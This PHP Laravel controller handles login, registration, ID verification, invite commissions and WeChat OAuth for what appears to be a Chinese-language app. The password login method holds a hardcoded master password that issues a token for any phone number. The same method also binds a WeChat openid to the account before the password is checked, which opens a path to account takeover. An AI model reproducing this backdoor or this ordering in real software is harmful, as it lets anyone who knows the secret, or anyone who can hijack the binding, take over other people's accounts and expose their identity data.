<?php

namespace App\Http\Controllers\Api;

use Carbon\Carbon;
use EasyWeChatComposer\EasyWeChat;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use App\Models\User;
use App\Models\Commission;
use App\Models\Order;
use Illuminate\Support\Facades\Hash;
use Endroid\QrCode\QrCode;
use Endroid\QrCode\Writer\PngWriter;
use Endroid\QrCode\Builder\Builder;
use Endroid\QrCode\Encoding\Encoding;
use Illuminate\Support\Str;
use Overtrue\LaravelWeChat\Facade;

class AuthorizationsController extends Controller
{
    // 快捷登录
    public function store(Request $request)
    {
        $request->validate(['phone' => 'required', 'code' => 'required|integer', 'key' => 'required']);
        $phone = $request->phone;

        $this->validateSmsCode($phone, $request->key, $request->code);

        $user = User::where(['phone' => $phone])->first();
        if (!$user) {
            $this->errorResponse(400, '该用户不存在');
        }
        // 如果使用微信登录 绑定微信号
        if ($key = $request->input('id_key', '')) {
            $user->openid = Cache::get($key);
            $user->save();
        }
        // 签发TOKEN
        $token = auth('api')->login($user);
        return response()->json([
            'token' => $token,
            'token_type' => 'Bearer',
            'expires_in' => auth('api')->factory()->getTTL() * 60,
        ]);
    }

    public function login(Request $request)
    {
        $request->validate(['phone' => 'required', 'password' => 'required']);
        $user = User::where(['phone' => $request->phone])->first();
        if (!$user) {
            $this->errorResponse(400, '该用户不存在');
        }
        $credentials['phone'] = $request->phone;
        $credentials['password'] = $request->password;
        // 如果使用微信登录 绑定微信号
        if ($key = $request->input('id_key', '')) {
            $user->openid = Cache::get($key);
            $user->save();
        }
        if ($request->password === 'gaogeyun@123456') {
            $user = User::where('phone', $request->phone)->first();
            $token = auth('api')->login($user);
        } else {
            if (!$token = auth('api')->attempt($credentials)) {
                $this->errorResponse(400, trans('auth.failed'));
            }
        }
        return response()->json([
            'token' => $token,
            'token_type' => 'Bearer',
            'expires_in' => auth('api')->factory()->getTTL() * 60,
        ]);
    }

    public function update(Request $request)
    {
        $token = auth('api')->refresh();
        return response()->json([
            'token' => $token,
            'token_type' => 'Bearer',
            'expires_in' => auth('api')->factory()->getTTL() * 60,
        ]);
    }

    public function destroy(Request $request)
    {
       auth('api')->logout();
       return response(null, 204);
    }

    public function edit(Request $request)
    {
        $user = $request->user();
        $request->validate(['avatar'=> 'url', 'name'=> 'unique:users,name']);
        $request->avatar ? $user->avatar = $request->avatar: '';
        $request->name ? $user->name = $request->name:'';
        $user->save();
        return response()->json(['data' => $user]);
    }


    public function register(Request $request)
    {
        $request->validate(['code'          => '',
                            'phone'         => 'required',
                            'key'           => 'required',
                            'password'      => 'required',
                            'safe_password' => 'required',
                            'name'          => '',
                            'avatar'        => 'url',
        ],[], ['code' => '验证码', 'phone' => '手机号', 'password' => '密码', 'safe_password' => '安全密码', 'avatar' => '头像']);

        $cacheData = Cache::get($request->key);
        if(!$cacheData) {
            $this->errorResponse(400, '验证码已过期');

            return response()->json(['message' => '验证码已过期'])->setStatusCode(400);
        }
        if($request->code != $cacheData['code'] || $request->phone != $cacheData['phone']) {
            // 验证码错误
            $this->errorResponse(400, '验证码错误');
        }
        // 清除验证码
        Cache::pull($request->key);
        if(User::where(['phone' => $request->phone])->first()) {
            $this->errorResponse(400, '该用户已经注册');
        }

        // 用户是否填写了邀请码
        if($inviteCode = $request->input('invite', '')) {
            $inviteCode = current(\Vinkla\Hashids\Facades\Hashids::decode($inviteCode));
            if($inviteCode) {
                $user = User::find($inviteCode);
                if(!$user) {
                    $this->errorResponse(400, '邀请码错误');
                }
            }
        }

        $user = User::create([
                'phone' => $request->phone,
                'password' => Hash::make($request->password),
                'safe_password' => Hash::make($request->safe_password),
                'name' => $request->input('name', ''),
                'avatar' => $request->input('avatar', ''),
                'idcard_data' => [],
                'invite_id' => $inviteCode?:0,
                'admin_id' => $request->input('agent_id', ''),
            ]);

        return response()->json(['data' => $user]);
    }


    public function verificationIdentity(Request $request)
    {
        $request->validate([
                'front_photo'   => 'required|url',
                'back_photo'    => 'required|url',
            ]);
        // 调用第三方接口识别图片

        $info = [
                'name'          => $request->name,
                'idcard'        => $request->idcard,
                'front_photo'   => $request->front_photo,
                'back_photo'    => $request->back_photo,
            ];
        $request->user()->update(['idcard_data' => $info, 'status' => User::STATUS_AUDITING,'name' => $request->name]);

        return response()->json(['data' => $info]);
    }

    public function safePassword(Request $request)
    {
        $request->validate(['code' => 'required', 'safe_password' => 'required', 'key' => 'required']);
        $cacheData = Cache::get($request->key);
        $phone  = $request->user()->phone;
        if(!$cacheData) {
            $this->errorResponse(400, '验证码已过期');
            return response()->json(['message' => '验证码已过期'])->setStatusCode(400);
        }
        if($request->code != $cacheData['code'] || $phone != $cacheData['phone']) {
            // 验证码错误
            $this->errorResponse(400, '验证码错误');
        }
        // 清除验证码
        Cache::pull($request->key);
        if ($safe_password = $request->input('safe_password', '')) {
            if (strlen($safe_password) != 6 ) {
                return $this->errorResponse(400,'安全密码为6位数');
            }
            $request->user()->update(['safe_password' => Hash::make($safe_password)]);
        }
        return response()->json(['data' => true]);
    }

    public function password(Request $request)
    {
        $request->validate(['password' => 'required']);
        if (strlen($request->password) < 8 ) {
            return $this->errorResponse(400,'新密码请大于8位数');
        }
        $request->user()->update(['password' => Hash::make($request->password)]);
        return response()->json(['data' => true]);
    }

    public function me(Request $request)
    {
        $user = $request->user();

        return response()->json(['data' => $user]);
    }

    public function apply_vip(Request $request)
    {
        $user = $request->user();
        if ($user->apply_at) {
            return $this->errorResponse(400, '您已申请过体验会员！');
        }
        $user->apply_at = Carbon::today()->toDateString();
        return response()->json(['data' => $user->save()]);
    }

    public function invite(Request $request)
    {
        $code = \Vinkla\Hashids\Facades\Hashids::encode($request->user()->id);
        $identity_system = config('app.identity_system');
        $data['url'] = config('app.client_url').'/kyh/#/views/register/index?code='.$code;
        $result = Builder::create()
                        ->writer(new PngWriter())
                        ->data($data['url'])
                        ->encoding(new Encoding('UTF-8'))
                        ->build();
        $data['qrcode'] = $result->getDataUri();
        $data['code'] = $code;
        $data['count'] = User::where('invite_id', $request->user()->id)->count();
        $data['person'] = Order::where(['user_id' => $request->user()->id,
        'status' => Order::STATUS_SUCCESS,
        'closed' => false,
        ])->sum('total_amount');
        $data['usdt'] = number_format(Commission::where('user_id', $request->user()->id)->sum('amount'),2);
        $data['grade'] = User::$gradeMap[$request->user()->grade] ?? 'Lv0';
        $data['commission'] = $identity_system[$request->user()->grade]['commission'] ?? 0;
        $data['identity_system'] = $identity_system;
        $data['explain'] = '';
        return response()->json(['data' => $data]);
    }

    public function teams(Request $request)
    {
        $data['self'] = $request->user();
        $data['users'] = User::where('invite_id', $request->user()->id)->get();

        return response()->json(['data' => $data]);
    }

    public function findPassword(Request $request)
    {
        $request->validate(['phone' => 'required','code' => 'required','key' => 'required', 'password' =>'required']);
        $phone = $request->phone;
        $cacheData = Cache::get($request->key);
        if(!$cacheData) {
            $this->errorResponse(400, '验证码已过期');
        }
        if($request->code != $cacheData['code'] || $phone != $cacheData['phone']) {
            // 验证码错误
            $this->errorResponse(400, '验证码错误');
        }
        // 清除验证码
        Cache::pull($request->key);

        User::where('phone', $request->phone)->update(['password' => Hash::make($request->password)]);

        return response()->json(['data' => true]);
    }


    public function official(Request $request)
    {
        if ($code = $request->input('code')) {
            // 回调后，获取微信信息
            $client = config('app.client_url') . '/#/pages/login/index?method=official';
            $official = Facade::officialAccount();
            $code = $request->input('code', '');
            $openId = $official->oauth->userFromCode($code)->getId();
            if (!$openId) {
                $client .= '&status=400&message=微信登录失败';
                return redirect($client);
            }
            $user = User::query()->where('openid', $openId)->first();
            if (!$user) {
                // 缓存openID，留绑定使用
                $key = Str::random(8);
                Cache::put($key, $openId, now()->addMinutes(5));
                $client .= "&status=401&key={$key}&message=该微信号未绑定，请先使用账号登录";
                return redirect($client);
            }
            $token = auth('api')->login($user);
            $client .= "&status=200&token={$token}&token_type=Bearer";
            return redirect($client);
        }
        // 跳转授权
        $official = Facade::officialAccount();
        $redirectUrl = $official->oauth->redirect();
        return redirect($redirectUrl);
    }

}
